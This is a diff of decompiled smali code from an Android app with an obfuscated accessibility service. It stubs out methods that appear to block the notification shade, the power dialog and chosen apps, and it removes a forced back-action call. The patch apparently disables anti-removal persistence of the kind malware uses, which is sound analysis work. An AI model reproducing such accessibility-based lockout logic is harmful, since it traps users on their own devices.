@@ -8341,7 +8341,9 @@
 .end method
 
 .method private final addShadeBarrier()V
-    .locals 11
+    .locals 0
+
+    return-void
 
     .line 1
     iget-boolean v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->shadeBarrierActive:Z
@@ -8995,7 +8997,9 @@
 .end method
 
 .method private final autoLockDangerousApps()V
-    .locals 8
+    .locals 0
+
+    return-void
 
     .line 1
     :try_start_0
@@ -9586,7 +9590,9 @@
 .end method
 
 .method private final blockAndGoHome()V
-    .locals 6
+    .locals 0
+
+    return-void
 
     .line 1
     invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
@@ -13675,7 +13681,9 @@
 .end method
 
 .method private final checkAppLock(Ljava/lang/String;)V
-    .locals 5
+    .locals 0
+
+    return-void
 
     .line 1
     sget-object v0, Lv/s/VpKcDcuRNaQkRJ5;->dDIMxZXP1V8HdM:Lv/s/VpKcDcuRNaQkRJ5;
@@ -14566,7 +14574,9 @@
 .end method
 
 .method private final checkPowerDialog()V
-    .locals 10
+    .locals 0
+
+    return-void
 
     .line 1
     invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
@@ -39150,32 +39160,6 @@
     .line 1222
     .line 1223
     :cond_1f
-    const/4 v2, 0x1
-
-    .line 1224
-    invoke-virtual {v1, v2}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z
-
-    .line 1225
-    .line 1226
-    .line 1227
-    new-instance v0, Lv/s/ssJAORu9Srr5Q9qO2sq;
-
-    .line 1228
-    .line 1229
-    const v2, 0x16
-
-    .line 1230
-    .line 1231
-    invoke-direct {v0, v1, v2}, Lv/s/ssJAORu9Srr5Q9qO2sq;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V
-
-    .line 1232
-    .line 1233
-    .line 1234
-    invoke-direct {v1, v0, v13, v14}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Lv/s/JRdueaGIH5g8DVCPba;J)V
-
-    .line 1235
-    .line 1236
-    .line 1237
     goto/16 :goto_3c
 
     .line 1238
